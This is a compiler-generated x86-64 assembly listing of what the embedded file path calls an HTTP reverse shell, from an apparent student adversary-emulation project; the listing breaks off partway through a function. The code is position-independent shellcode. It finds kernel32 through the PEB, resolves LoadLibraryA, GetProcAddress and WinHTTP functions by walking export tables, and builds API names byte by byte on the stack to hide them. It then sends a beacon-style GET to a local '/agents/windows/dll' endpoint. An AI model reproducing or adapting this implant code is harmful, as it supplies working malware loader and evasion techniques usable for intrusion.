; Listing generated by Microsoft (R) Optimizing Compiler Version 19.36.32532.0 

;include listing.inc

; INCLUDELIB LIBCMT
; INCLUDELIB OLDNAMES

PUBLIC	?kernel32_str@@3PA_WA				; kernel32_str
PUBLIC	?load_lib_str@@3PADA				; load_lib_str
CONST	SEGMENT
$SG93549 DB	'W', 00H, 'i', 00H, 'n', 00H, 'H', 00H, 'T', 00H, 'T', 00H
	DB	'P', 00H, ' ', 00H, 'E', 00H, 'x', 00H, 'a', 00H, 'm', 00H, 'p'
	DB	00H, 'l', 00H, 'e', 00H, '/', 00H, '1', 00H, '.', 00H, '0', 00H
	DB	00H, 00H
$SG93550 DB	'l', 00H, 'o', 00H, 'c', 00H, 'a', 00H, 'l', 00H, 'h', 00H
	DB	'o', 00H, 's', 00H, 't', 00H, 00H, 00H
	ORG $+4
$SG93551 DB	'/', 00H, 'a', 00H, 'g', 00H, 'e', 00H, 'n', 00H, 't', 00H
	DB	's', 00H, '/', 00H, 'w', 00H, 'i', 00H, 'n', 00H, 'd', 00H, 'o'
	DB	00H, 'w', 00H, 's', 00H, '/', 00H, 'd', 00H, 'l', 00H, 'l', 00H
	DB	00H, 00H
$SG93552 DB	'G', 00H, 'E', 00H, 'T', 00H, 00H, 00H
CONST	ENDS
_TEXT	SEGMENT
?load_lib_str@@3PADA DB 'LoadLibraryA', 00H		; load_lib_str
	ORG $+3
?kernel32_str@@3PA_WA DB 'k', 00H, 'e', 00H, 'r', 00H, 'n', 00H, 'e', 00H
	DB	'l', 00H, '3', 00H, '2', 00H, '.', 00H, 'd', 00H, 'l', 00H, 'l'
	DB	00H, 00H, 00H				; kernel32_str
AlignRSP PROC

    push rsi ; Preserve RSI since we're stomping on it
	mov rsi, rsp ; Save the value of RSP so it can be restored
	and rsp, 0FFFFFFFFFFFFFFF0h ; Align RSP to 16 bytes
	sub rsp, 020h ; Allocate homing space for ExecutePayload
	call main ; Call the entry point of the payload
	mov rsp, rsi ; Restore the original value of RSP
	pop rsi ; Restore RSI
	ret ; Return to caller

AlignRSP ENDP
_TEXT	ENDS
PUBLIC	?get_module_by_name@@YAPEAXPEA_W@Z		; get_module_by_name
PUBLIC	?get_func_by_name@@YAPEAXPEAXPEAD@Z		; get_func_by_name
PUBLIC	main
;	COMDAT pdata

; Function compile flags: /Odtp
_TEXT	SEGMENT
user32_dll_name$ = 64
winhttp_str$ = 80
winhttpopen_str$ = 96
load_lib_name$ = 112
get_proc_name$ = 128
winhttpconnect_str$ = 144
winhttpopenrequest_str$ = 160
winhttpsendrequest_str$ = 184
message_box_name$ = 208
winhttp_dll$ = 224
kernel32_dll_name$ = 232
base$ = 264
msg_title$ = 272
msg_content$ = 288
load_lib$ = 320
get_proc$ = 328
_LoadLibraryA$ = 336
bResults$ = 344
winhttpopen$ = 352
winhttpconnect$ = 360
winhttpopenrequest$ = 368
winhttpsendrequest$ = 376
_WinHttpOpen$ = 384
hSession$ = 392
_WinHttpConnect$ = 400
hConnect$ = 408
_WinHttpOpenRequest$ = 416
hRequest$ = 424
_WinHttpSendRequest$ = 432
_GetProcAddress$ = 440
u32_dll$ = 448
main	PROC
; File Z:\Desktop\capstone-adversary-emulation-tool\Implementation\Code\Trying Something\PIC_httpreverse_shell.cpp
; Line 15
$LN6:
	sub	rsp, 472				; 000001d8H
; Line 17
	mov	eax, 107				; 0000006bH
	mov	WORD PTR kernel32_dll_name$[rsp], ax
	mov	eax, 101				; 00000065H
	mov	WORD PTR kernel32_dll_name$[rsp+2], ax
	mov	eax, 114				; 00000072H
	mov	WORD PTR kernel32_dll_name$[rsp+4], ax
	mov	eax, 110				; 0000006eH
	mov	WORD PTR kernel32_dll_name$[rsp+6], ax
	mov	eax, 101				; 00000065H
	mov	WORD PTR kernel32_dll_name$[rsp+8], ax
	mov	eax, 108				; 0000006cH
	mov	WORD PTR kernel32_dll_name$[rsp+10], ax
	mov	eax, 51					; 00000033H
	mov	WORD PTR kernel32_dll_name$[rsp+12], ax
	mov	eax, 50					; 00000032H
	mov	WORD PTR kernel32_dll_name$[rsp+14], ax
	mov	eax, 46					; 0000002eH
	mov	WORD PTR kernel32_dll_name$[rsp+16], ax
	mov	eax, 100				; 00000064H
	mov	WORD PTR kernel32_dll_name$[rsp+18], ax
	mov	eax, 108				; 0000006cH
	mov	WORD PTR kernel32_dll_name$[rsp+20], ax
	mov	eax, 108				; 0000006cH
	mov	WORD PTR kernel32_dll_name$[rsp+22], ax
	xor	eax, eax
	mov	WORD PTR kernel32_dll_name$[rsp+24], ax
; Line 18
	mov	BYTE PTR load_lib_name$[rsp], 76	; 0000004cH
	mov	BYTE PTR load_lib_name$[rsp+1], 111	; 0000006fH
	mov	BYTE PTR load_lib_name$[rsp+2], 97	; 00000061H
	mov	BYTE PTR load_lib_name$[rsp+3], 100	; 00000064H
	mov	BYTE PTR load_lib_name$[rsp+4], 76	; 0000004cH
	mov	BYTE PTR load_lib_name$[rsp+5], 105	; 00000069H
	mov	BYTE PTR load_lib_name$[rsp+6], 98	; 00000062H
	mov	BYTE PTR load_lib_name$[rsp+7], 114	; 00000072H
	mov	BYTE PTR load_lib_name$[rsp+8], 97	; 00000061H
	mov	BYTE PTR load_lib_name$[rsp+9], 114	; 00000072H
	mov	BYTE PTR load_lib_name$[rsp+10], 121	; 00000079H
	mov	BYTE PTR load_lib_name$[rsp+11], 65	; 00000041H
	mov	BYTE PTR load_lib_name$[rsp+12], 0
; Line 19
	mov	BYTE PTR get_proc_name$[rsp], 71	; 00000047H
	mov	BYTE PTR get_proc_name$[rsp+1], 101	; 00000065H
	mov	BYTE PTR get_proc_name$[rsp+2], 116	; 00000074H
	mov	BYTE PTR get_proc_name$[rsp+3], 80	; 00000050H
	mov	BYTE PTR get_proc_name$[rsp+4], 114	; 00000072H
	mov	BYTE PTR get_proc_name$[rsp+5], 111	; 0000006fH
	mov	BYTE PTR get_proc_name$[rsp+6], 99	; 00000063H
	mov	BYTE PTR get_proc_name$[rsp+7], 65	; 00000041H
	mov	BYTE PTR get_proc_name$[rsp+8], 100	; 00000064H
	mov	BYTE PTR get_proc_name$[rsp+9], 100	; 00000064H
	mov	BYTE PTR get_proc_name$[rsp+10], 114	; 00000072H
	mov	BYTE PTR get_proc_name$[rsp+11], 101	; 00000065H
	mov	BYTE PTR get_proc_name$[rsp+12], 115	; 00000073H
	mov	BYTE PTR get_proc_name$[rsp+13], 115	; 00000073H
	mov	BYTE PTR get_proc_name$[rsp+14], 0
; Line 20
	mov	BYTE PTR user32_dll_name$[rsp], 117	; 00000075H
	mov	BYTE PTR user32_dll_name$[rsp+1], 115	; 00000073H
	mov	BYTE PTR user32_dll_name$[rsp+2], 101	; 00000065H
	mov	BYTE PTR user32_dll_name$[rsp+3], 114	; 00000072H
	mov	BYTE PTR user32_dll_name$[rsp+4], 51	; 00000033H
	mov	BYTE PTR user32_dll_name$[rsp+5], 50	; 00000032H
	mov	BYTE PTR user32_dll_name$[rsp+6], 46	; 0000002eH
	mov	BYTE PTR user32_dll_name$[rsp+7], 100	; 00000064H
	mov	BYTE PTR user32_dll_name$[rsp+8], 108	; 0000006cH
	mov	BYTE PTR user32_dll_name$[rsp+9], 108	; 0000006cH
	mov	BYTE PTR user32_dll_name$[rsp+10], 0
; Line 21
	mov	BYTE PTR message_box_name$[rsp], 77	; 0000004dH
	mov	BYTE PTR message_box_name$[rsp+1], 101	; 00000065H
	mov	BYTE PTR message_box_name$[rsp+2], 115	; 00000073H
	mov	BYTE PTR message_box_name$[rsp+3], 115	; 00000073H
	mov	BYTE PTR message_box_name$[rsp+4], 97	; 00000061H
	mov	BYTE PTR message_box_name$[rsp+5], 103	; 00000067H
	mov	BYTE PTR message_box_name$[rsp+6], 101	; 00000065H
	mov	BYTE PTR message_box_name$[rsp+7], 66	; 00000042H
	mov	BYTE PTR message_box_name$[rsp+8], 111	; 0000006fH
	mov	BYTE PTR message_box_name$[rsp+9], 120	; 00000078H
	mov	BYTE PTR message_box_name$[rsp+10], 87	; 00000057H
	mov	BYTE PTR message_box_name$[rsp+11], 0
; Line 24
	mov	BYTE PTR winhttp_str$[rsp], 119		; 00000077H
	mov	BYTE PTR winhttp_str$[rsp+1], 105	; 00000069H
	mov	BYTE PTR winhttp_str$[rsp+2], 110	; 0000006eH
	mov	BYTE PTR winhttp_str$[rsp+3], 104	; 00000068H
	mov	BYTE PTR winhttp_str$[rsp+4], 116	; 00000074H
	mov	BYTE PTR winhttp_str$[rsp+5], 116	; 00000074H
	mov	BYTE PTR winhttp_str$[rsp+6], 112	; 00000070H
	mov	BYTE PTR winhttp_str$[rsp+7], 46	; 0000002eH
	mov	BYTE PTR winhttp_str$[rsp+8], 100	; 00000064H
	mov	BYTE PTR winhttp_str$[rsp+9], 108	; 0000006cH
	mov	BYTE PTR winhttp_str$[rsp+10], 108	; 0000006cH
	mov	BYTE PTR winhttp_str$[rsp+11], 0
; Line 25
	mov	BYTE PTR winhttpopen_str$[rsp], 87	; 00000057H
	mov	BYTE PTR winhttpopen_str$[rsp+1], 105	; 00000069H
	mov	BYTE PTR winhttpopen_str$[rsp+2], 110	; 0000006eH
	mov	BYTE PTR winhttpopen_str$[rsp+3], 72	; 00000048H
	mov	BYTE PTR winhttpopen_str$[rsp+4], 116	; 00000074H
	mov	BYTE PTR winhttpopen_str$[rsp+5], 116	; 00000074H
	mov	BYTE PTR winhttpopen_str$[rsp+6], 112	; 00000070H
	mov	BYTE PTR winhttpopen_str$[rsp+7], 79	; 0000004fH
	mov	BYTE PTR winhttpopen_str$[rsp+8], 112	; 00000070H
	mov	BYTE PTR winhttpopen_str$[rsp+9], 101	; 00000065H
	mov	BYTE PTR winhttpopen_str$[rsp+10], 110	; 0000006eH
	mov	BYTE PTR winhttpopen_str$[rsp+11], 0
; Line 26
	mov	BYTE PTR winhttpconnect_str$[rsp], 87	; 00000057H
	mov	BYTE PTR winhttpconnect_str$[rsp+1], 105 ; 00000069H
	mov	BYTE PTR winhttpconnect_str$[rsp+2], 110 ; 0000006eH
	mov	BYTE PTR winhttpconnect_str$[rsp+3], 72	; 00000048H
	mov	BYTE PTR winhttpconnect_str$[rsp+4], 116 ; 00000074H
	mov	BYTE PTR winhttpconnect_str$[rsp+5], 116 ; 00000074H
	mov	BYTE PTR winhttpconnect_str$[rsp+6], 112 ; 00000070H
	mov	BYTE PTR winhttpconnect_str$[rsp+7], 67	; 00000043H
	mov	BYTE PTR winhttpconnect_str$[rsp+8], 111 ; 0000006fH
	mov	BYTE PTR winhttpconnect_str$[rsp+9], 110 ; 0000006eH
	mov	BYTE PTR winhttpconnect_str$[rsp+10], 110 ; 0000006eH
	mov	BYTE PTR winhttpconnect_str$[rsp+11], 101 ; 00000065H
	mov	BYTE PTR winhttpconnect_str$[rsp+12], 99 ; 00000063H
	mov	BYTE PTR winhttpconnect_str$[rsp+13], 116 ; 00000074H
	mov	BYTE PTR winhttpconnect_str$[rsp+14], 0
; Line 27
	mov	BYTE PTR winhttpopenrequest_str$[rsp], 87 ; 00000057H
	mov	BYTE PTR winhttpopenrequest_str$[rsp+1], 105 ; 00000069H
	mov	BYTE PTR winhttpopenrequest_str$[rsp+2], 110 ; 0000006eH
	mov	BYTE PTR winhttpopenrequest_str$[rsp+3], 72 ; 00000048H
	mov	BYTE PTR winhttpopenrequest_str$[rsp+4], 116 ; 00000074H
	mov	BYTE PTR winhttpopenrequest_str$[rsp+5], 116 ; 00000074H
	mov	BYTE PTR winhttpopenrequest_str$[rsp+6], 112 ; 00000070H
	mov	BYTE PTR winhttpopenrequest_str$[rsp+7], 79 ; 0000004fH
	mov	BYTE PTR winhttpopenrequest_str$[rsp+8], 112 ; 00000070H
	mov	BYTE PTR winhttpopenrequest_str$[rsp+9], 101 ; 00000065H
	mov	BYTE PTR winhttpopenrequest_str$[rsp+10], 110 ; 0000006eH
	mov	BYTE PTR winhttpopenrequest_str$[rsp+11], 82 ; 00000052H
	mov	BYTE PTR winhttpopenrequest_str$[rsp+12], 101 ; 00000065H
	mov	BYTE PTR winhttpopenrequest_str$[rsp+13], 113 ; 00000071H
	mov	BYTE PTR winhttpopenrequest_str$[rsp+14], 117 ; 00000075H
	mov	BYTE PTR winhttpopenrequest_str$[rsp+15], 101 ; 00000065H
	mov	BYTE PTR winhttpopenrequest_str$[rsp+16], 115 ; 00000073H
	mov	BYTE PTR winhttpopenrequest_str$[rsp+17], 116 ; 00000074H
	mov	BYTE PTR winhttpopenrequest_str$[rsp+18], 0
; Line 28
	mov	BYTE PTR winhttpsendrequest_str$[rsp], 87 ; 00000057H
	mov	BYTE PTR winhttpsendrequest_str$[rsp+1], 105 ; 00000069H
	mov	BYTE PTR winhttpsendrequest_str$[rsp+2], 110 ; 0000006eH
	mov	BYTE PTR winhttpsendrequest_str$[rsp+3], 72 ; 00000048H
	mov	BYTE PTR winhttpsendrequest_str$[rsp+4], 116 ; 00000074H
	mov	BYTE PTR winhttpsendrequest_str$[rsp+5], 116 ; 00000074H
	mov	BYTE PTR winhttpsendrequest_str$[rsp+6], 112 ; 00000070H
	mov	BYTE PTR winhttpsendrequest_str$[rsp+7], 83 ; 00000053H
	mov	BYTE PTR winhttpsendrequest_str$[rsp+8], 101 ; 00000065H
	mov	BYTE PTR winhttpsendrequest_str$[rsp+9], 110 ; 0000006eH
	mov	BYTE PTR winhttpsendrequest_str$[rsp+10], 100 ; 00000064H
	mov	BYTE PTR winhttpsendrequest_str$[rsp+11], 82 ; 00000052H
	mov	BYTE PTR winhttpsendrequest_str$[rsp+12], 101 ; 00000065H
	mov	BYTE PTR winhttpsendrequest_str$[rsp+13], 113 ; 00000071H
	mov	BYTE PTR winhttpsendrequest_str$[rsp+14], 117 ; 00000075H
	mov	BYTE PTR winhttpsendrequest_str$[rsp+15], 101 ; 00000065H
	mov	BYTE PTR winhttpsendrequest_str$[rsp+16], 115 ; 00000073H
	mov	BYTE PTR winhttpsendrequest_str$[rsp+17], 116 ; 00000074H
	mov	BYTE PTR winhttpsendrequest_str$[rsp+18], 0
; Line 31
	mov	eax, 72					; 00000048H
	mov	WORD PTR msg_content$[rsp], ax
	mov	eax, 101				; 00000065H
	mov	WORD PTR msg_content$[rsp+2], ax
	mov	eax, 108				; 0000006cH
	mov	WORD PTR msg_content$[rsp+4], ax
	mov	eax, 108				; 0000006cH
	mov	WORD PTR msg_content$[rsp+6], ax
	mov	eax, 111				; 0000006fH
	mov	WORD PTR msg_content$[rsp+8], ax
	mov	eax, 32					; 00000020H
	mov	WORD PTR msg_content$[rsp+10], ax
	mov	eax, 87					; 00000057H
	mov	WORD PTR msg_content$[rsp+12], ax
	mov	eax, 111				; 0000006fH
	mov	WORD PTR msg_content$[rsp+14], ax
	mov	eax, 114				; 00000072H
	mov	WORD PTR msg_content$[rsp+16], ax
	mov	eax, 108				; 0000006cH
	mov	WORD PTR msg_content$[rsp+18], ax
	mov	eax, 100				; 00000064H
	mov	WORD PTR msg_content$[rsp+20], ax
	mov	eax, 33					; 00000021H
	mov	WORD PTR msg_content$[rsp+22], ax
	xor	eax, eax
	mov	WORD PTR msg_content$[rsp+24], ax
; Line 32
	mov	eax, 68					; 00000044H
	mov	WORD PTR msg_title$[rsp], ax
	mov	eax, 101				; 00000065H
	mov	WORD PTR msg_title$[rsp+2], ax
	mov	eax, 109				; 0000006dH
	mov	WORD PTR msg_title$[rsp+4], ax
	mov	eax, 111				; 0000006fH
	mov	WORD PTR msg_title$[rsp+6], ax
	mov	eax, 33					; 00000021H
	mov	WORD PTR msg_title$[rsp+8], ax
	xor	eax, eax
	mov	WORD PTR msg_title$[rsp+10], ax
; Line 35
	lea	rcx, QWORD PTR kernel32_dll_name$[rsp]
	call	?get_module_by_name@@YAPEAXPEA_W@Z	; get_module_by_name
	mov	QWORD PTR base$[rsp], rax
; Line 36
	cmp	QWORD PTR base$[rsp], 0
	jne	SHORT $LN2@main
; Line 37
	mov	eax, 1
	jmp	$LN1@main
$LN2@main:
; Line 41
	lea	rdx, QWORD PTR load_lib_name$[rsp]
	mov	rcx, QWORD PTR base$[rsp]
	call	?get_func_by_name@@YAPEAXPEAXPEAD@Z	; get_func_by_name
	mov	QWORD PTR load_lib$[rsp], rax
; Line 42
	cmp	QWORD PTR load_lib$[rsp], 0
	jne	SHORT $LN3@main
; Line 43
	mov	eax, 2
	jmp	$LN1@main
$LN3@main:
; Line 47
	lea	rdx, QWORD PTR get_proc_name$[rsp]
	mov	rcx, QWORD PTR base$[rsp]
	call	?get_func_by_name@@YAPEAXPEAXPEAD@Z	; get_func_by_name
	mov	QWORD PTR get_proc$[rsp], rax
; Line 48
	cmp	QWORD PTR get_proc$[rsp], 0
	jne	SHORT $LN4@main
; Line 49
	mov	eax, 3
	jmp	$LN1@main
$LN4@main:
; Line 53
	mov	rax, QWORD PTR load_lib$[rsp]
	mov	QWORD PTR _LoadLibraryA$[rsp], rax
; Line 55
	mov	rax, QWORD PTR get_proc$[rsp]
	mov	QWORD PTR _GetProcAddress$[rsp], rax
; Line 58
	lea	rcx, QWORD PTR user32_dll_name$[rsp]
	call	QWORD PTR _LoadLibraryA$[rsp]
	mov	QWORD PTR u32_dll$[rsp], rax
; Line 59
	lea	rcx, QWORD PTR winhttp_str$[rsp]
	call	QWORD PTR _LoadLibraryA$[rsp]
	mov	QWORD PTR winhttp_dll$[rsp], rax
; Line 62
	lea	rdx, QWORD PTR winhttpopen_str$[rsp]
	mov	rcx, QWORD PTR winhttp_dll$[rsp]
	call	?get_func_by_name@@YAPEAXPEAXPEAD@Z	; get_func_by_name
	mov	QWORD PTR winhttpopen$[rsp], rax
; Line 63
	lea	rdx, QWORD PTR winhttpconnect_str$[rsp]
	mov	rcx, QWORD PTR winhttp_dll$[rsp]
	call	?get_func_by_name@@YAPEAXPEAXPEAD@Z	; get_func_by_name
	mov	QWORD PTR winhttpconnect$[rsp], rax
; Line 64
	lea	rdx, QWORD PTR winhttpopenrequest_str$[rsp]
	mov	rcx, QWORD PTR winhttp_dll$[rsp]
	call	?get_func_by_name@@YAPEAXPEAXPEAD@Z	; get_func_by_name
	mov	QWORD PTR winhttpopenrequest$[rsp], rax
; Line 65
	lea	rdx, QWORD PTR winhttpsendrequest_str$[rsp]
	mov	rcx, QWORD PTR winhttp_dll$[rsp]
	call	?get_func_by_name@@YAPEAXPEAXPEAD@Z	; get_func_by_name
	mov	QWORD PTR winhttpsendrequest$[rsp], rax
; Line 68
	mov	rax, QWORD PTR winhttpopen$[rsp]
	mov	QWORD PTR _WinHttpOpen$[rsp], rax
; Line 69
	mov	rax, QWORD PTR winhttpconnect$[rsp]
	mov	QWORD PTR _WinHttpConnect$[rsp], rax
; Line 70
	mov	rax, QWORD PTR winhttpopenrequest$[rsp]
	mov	QWORD PTR _WinHttpOpenRequest$[rsp], rax
; Line 71
	mov	rax, QWORD PTR winhttpsendrequest$[rsp]
	mov	QWORD PTR _WinHttpSendRequest$[rsp], rax
; Line 74
	mov	DWORD PTR [rsp+32], 0
	xor	r9d, r9d
	xor	r8d, r8d
	xor	edx, edx
	lea	rcx, OFFSET $SG93549
	call	QWORD PTR _WinHttpOpen$[rsp]
	mov	QWORD PTR hSession$[rsp], rax
; Line 75
	xor	r9d, r9d
	mov	r8w, 8081				; 00001f91H
	lea	rdx, OFFSET $SG93550
	mov	rcx, QWORD PTR hSession$[rsp]
	call	QWORD PTR _WinHttpConnect$[rsp]
	mov	QWORD PTR hConnect$[rsp], rax
; Line 76
	mov	DWORD PTR [rsp+48], 0
	mov	QWORD PTR [rsp+40], 0
	mov	QWORD PTR [rsp+32], 0
	xor	r9d, r9d
	lea	r8, OFFSET $SG93551
	lea	rdx, OFFSET $SG93552
	mov	rcx, QWORD PTR hConnect$[rsp]
	call	QWORD PTR _WinHttpOpenRequest$[rsp]
	mov	QWORD PTR hRequest$[rsp], rax
; Line 77
	mov	QWORD PTR [rsp+48], 0
	mov	DWORD PTR [rsp+40], 0
	mov	DWORD PTR [rsp+32], 0
	xor	r9d, r9d
	xor	r8d, r8d
	xor	edx, edx
	mov	rcx, QWORD PTR hRequest$[rsp]
	call	QWORD PTR _WinHttpSendRequest$[rsp]
	mov	DWORD PTR bResults$[rsp], eax
; Line 96
	xor	eax, eax
$LN1@main:
; Line 97
	add	rsp, 472				; 000001d8H
	ret	0
main	ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ?get_func_by_name@@YAPEAXPEAXPEAD@Z
_TEXT	SEGMENT
k$1 = 0
i$2 = 8
exp$ = 16
expAddr$ = 24
funcNamesListRVA$ = 28
namesOrdsListRVA$ = 32
funcsListRVA$ = 36
curr_name$3 = 40
idh$ = 48
exportsDir$ = 56
nt_headers$ = 64
namesCount$ = 72
nameIndex$4 = 80
nameRVA$5 = 88
funcRVA$6 = 96
module$ = 128
func_name$ = 136
?get_func_by_name@@YAPEAXPEAXPEAD@Z PROC		; get_func_by_name, COMDAT
; File Z:\Desktop\capstone-adversary-emulation-tool\Implementation\Code\Trying Something\peb-lookup.h
; Line 104
$LN13:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 120				; 00000078H
; Line 105
	mov	rax, QWORD PTR module$[rsp]
	mov	QWORD PTR idh$[rsp], rax
; Line 106
	mov	rax, QWORD PTR idh$[rsp]
	movzx	eax, WORD PTR [rax]
	cmp	eax, 23117				; 00005a4dH
	je	SHORT $LN8@get_func_b
; Line 107
	xor	eax, eax
	jmp	$LN1@get_func_b
$LN8@get_func_b:
; Line 109
	mov	rax, QWORD PTR idh$[rsp]
	movsxd	rax, DWORD PTR [rax+60]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR nt_headers$[rsp], rax
; Line 110
	mov	eax, 8
	imul	rax, rax, 0
	mov	rcx, QWORD PTR nt_headers$[rsp]
	lea	rax, QWORD PTR [rcx+rax+136]
	mov	QWORD PTR exportsDir$[rsp], rax
; Line 111
	mov	rax, QWORD PTR exportsDir$[rsp]
	cmp	DWORD PTR [rax], 0
	jne	SHORT $LN9@get_func_b
; Line 112
	xor	eax, eax
	jmp	$LN1@get_func_b
$LN9@get_func_b:
; Line 115
	mov	rax, QWORD PTR exportsDir$[rsp]
	mov	eax, DWORD PTR [rax]
	mov	DWORD PTR expAddr$[rsp], eax
; Line 116
	mov	eax, DWORD PTR expAddr$[rsp]
	add	rax, QWORD PTR module$[rsp]
	mov	QWORD PTR exp$[rsp], rax
; Line 117
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+24]
	mov	QWORD PTR namesCount$[rsp], rax
; Line 119
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+28]
	mov	DWORD PTR funcsListRVA$[rsp], eax
; Line 120
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+32]
	mov	DWORD PTR funcNamesListRVA$[rsp], eax
; Line 121
	mov	rax, QWORD PTR exp$[rsp]
	mov	eax, DWORD PTR [rax+36]
	mov	DWORD PTR namesOrdsListRVA$[rsp], eax
; Line 124
	mov	QWORD PTR i$2[rsp], 0
	jmp	SHORT $LN4@get_func_b
$LN2@get_func_b:
	mov	rax, QWORD PTR i$2[rsp]
	inc	rax
	mov	QWORD PTR i$2[rsp], rax
$LN4@get_func_b:
	mov	rax, QWORD PTR namesCount$[rsp]
	cmp	QWORD PTR i$2[rsp], rax
	jae	$LN3@get_func_b
; Line 125
	mov	eax, DWORD PTR funcNamesListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR i$2[rsp]
	lea	rax, QWORD PTR [rax+rcx*4]
	mov	QWORD PTR nameRVA$5[rsp], rax
; Line 126
	mov	eax, DWORD PTR namesOrdsListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR i$2[rsp]
	lea	rax, QWORD PTR [rax+rcx*2]
	mov	QWORD PTR nameIndex$4[rsp], rax
; Line 127
	mov	eax, DWORD PTR funcsListRVA$[rsp]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, QWORD PTR nameIndex$4[rsp]
	movzx	ecx, WORD PTR [rcx]
	lea	rax, QWORD PTR [rax+rcx*4]
	mov	QWORD PTR funcRVA$6[rsp], rax
; Line 129
	mov	rax, QWORD PTR nameRVA$5[rsp]
	mov	eax, DWORD PTR [rax]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR curr_name$3[rsp], rax
; Line 130
	mov	QWORD PTR k$1[rsp], 0
; Line 131
	mov	QWORD PTR k$1[rsp], 0
	jmp	SHORT $LN7@get_func_b
$LN5@get_func_b:
	mov	rax, QWORD PTR k$1[rsp]
	inc	rax
	mov	QWORD PTR k$1[rsp], rax
$LN7@get_func_b:
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	je	SHORT $LN6@get_func_b
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR curr_name$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	je	SHORT $LN6@get_func_b
; Line 132
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	mov	rcx, QWORD PTR k$1[rsp]
	mov	rdx, QWORD PTR curr_name$3[rsp]
	add	rdx, rcx
	mov	rcx, rdx
	movsx	ecx, BYTE PTR [rcx]
	cmp	eax, ecx
	je	SHORT $LN10@get_func_b
	jmp	SHORT $LN6@get_func_b
$LN10@get_func_b:
; Line 133
	jmp	SHORT $LN5@get_func_b
$LN6@get_func_b:
; Line 134
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR func_name$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	jne	SHORT $LN11@get_func_b
	mov	rax, QWORD PTR k$1[rsp]
	mov	rcx, QWORD PTR curr_name$3[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	test	eax, eax
	jne	SHORT $LN11@get_func_b
; Line 136
	mov	rax, QWORD PTR funcRVA$6[rsp]
	mov	eax, DWORD PTR [rax]
	mov	rcx, QWORD PTR module$[rsp]
	add	rcx, rax
	mov	rax, rcx
	jmp	SHORT $LN1@get_func_b
$LN11@get_func_b:
; Line 138
	jmp	$LN2@get_func_b
$LN3@get_func_b:
; Line 139
	xor	eax, eax
$LN1@get_func_b:
; Line 140
	add	rsp, 120				; 00000078H
	ret	0
?get_func_by_name@@YAPEAXPEAXPEAD@Z ENDP		; get_func_by_name
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT ?get_module_by_name@@YAPEAXPEA_W@Z
_TEXT	SEGMENT
i$1 = 0
tv136 = 8
tv155 = 10
c1$2 = 12
c2$3 = 16
curr_name$4 = 24
curr_module$ = 32
tv132 = 40
tv151 = 44
peb$ = 48
ldr$ = 56
Flink$ = 64
list$ = 72
module_name$ = 128
?get_module_by_name@@YAPEAXPEA_W@Z PROC			; get_module_by_name, COMDAT
; File Z:\Desktop\capstone-adversary-emulation-tool\Implementation\Code\Trying Something\peb-lookup.h
; Line 69
$LN16:
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 104				; 00000068H
; Line 70
	mov	QWORD PTR peb$[rsp], 0
; Line 72
	mov	rax, QWORD PTR gs:[96]
	mov	QWORD PTR peb$[rsp], rax
; Line 76
	mov	rax, QWORD PTR peb$[rsp]
	mov	rax, QWORD PTR [rax+24]
	mov	QWORD PTR ldr$[rsp], rax
; Line 77
	lea	rax, QWORD PTR list$[rsp]
	mov	rcx, QWORD PTR ldr$[rsp]
	mov	rdi, rax
	lea	rsi, QWORD PTR [rcx+16]
	mov	ecx, 16
	rep movsb
; Line 79
	mov	rax, QWORD PTR list$[rsp]
	mov	QWORD PTR Flink$[rsp], rax
; Line 80
	mov	rax, QWORD PTR Flink$[rsp]
	mov	QWORD PTR curr_module$[rsp], rax
$LN15@get_module:
$LN2@get_module:
; Line 82
	cmp	QWORD PTR curr_module$[rsp], 0
	je	$LN3@get_module
	mov	rax, QWORD PTR curr_module$[rsp]
	cmp	QWORD PTR [rax+48], 0
	je	$LN3@get_module
; Line 83
	mov	rax, QWORD PTR curr_module$[rsp]
	cmp	QWORD PTR [rax+96], 0
	jne	SHORT $LN7@get_module
	jmp	SHORT $LN2@get_module
$LN7@get_module:
; Line 84
	mov	rax, QWORD PTR curr_module$[rsp]
	mov	rax, QWORD PTR [rax+96]
	mov	QWORD PTR curr_name$4[rsp], rax
; Line 86
	mov	QWORD PTR i$1[rsp], 0
; Line 87
	mov	QWORD PTR i$1[rsp], 0
	jmp	SHORT $LN6@get_module
$LN4@get_module:
	mov	rax, QWORD PTR i$1[rsp]
	inc	rax
	mov	QWORD PTR i$1[rsp], rax
$LN6@get_module:
	mov	rax, QWORD PTR module_name$[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	je	$LN5@get_module
	mov	rax, QWORD PTR curr_name$4[rsp]
	mov	rcx, QWORD PTR i$1[rsp]
	movzx	eax, WORD PTR [rax+rcx*2]
	test	eax, eax
	je	$LN5@get_module
; Line 89
	mov	rax, QWORD PTR module_name$[rsp]
